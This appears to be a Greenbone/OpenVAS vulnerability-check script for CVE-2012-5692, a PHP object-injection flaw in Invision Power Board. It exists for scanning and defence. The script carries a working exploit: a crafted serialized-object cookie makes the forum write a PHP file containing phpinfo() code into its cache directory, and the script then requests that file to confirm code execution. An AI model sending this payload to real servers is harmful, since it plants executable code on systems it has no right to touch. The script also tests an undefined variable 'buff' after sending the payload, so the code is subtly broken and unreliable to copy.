CPE = "cpe:/a:invision_power_services:invision_power_board";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103601" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2012-5692" );
	script_name( "Invision Power Board 'unserialize()' PHP Code Execution" );
	script_xref( name: "URL", value: "http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-security-update/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22398/" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-11-01 16:02:27 +0200 (Thu, 01 Nov 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "invision_power_board_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "invision_power_board/installed" );
	script_tag( name: "solution", value: "The vendor has released a patch to address this vulnerability." );
	script_tag( name: "summary", value: "Invision Power Board is prone to a PHP Code Execution vulnerability
  because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to inject and execute arbitrary
  malicious PHP code in the context of the affected application. This
  may facilitate a compromise of the application and the underlying
  system, other attacks are also possible." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
req = http_get( item: dir + "/index.php", port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!buf){
	exit( 0 );
}
prefix = eregmatch( pattern: "Cookie: (.+)session", string: buf );
host = http_host_name( port: port );
vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + ".php";
req = NASLString( "GET ", dir, "/index.php?<?error_reporting(0);print(___);phpinfo();die;?> HTTP/1.0\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", prefix, "member_id=a%3A1%3A%7Bi%3A0%3BO%3A15%3A%22db_driver_mysql%22%3A1%3A%7Bs%3A3%3A%22obj%22%3Ba%3A2%3A%7Bs%3A13%3A%22use_debug_log%22%3Bi%3A1%3Bs%3A9%3A%22debug_log%22%3Bs%3A27%3A%22cache%2F", file, "%22%3B%7D%7D%7D\\r\\n", "Connection: close\\r\\n\\r\\n" );
buf = http_send_recv( port: port, data: req, bodyonly: FALSE );
if(!buff || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
	exit( 0 );
}
sleep( 3 );
url = dir + "/cache/" + file;
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!buf){
	exit( 0 );
}
if(ContainsString( buf, "<title>phpinfo()" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

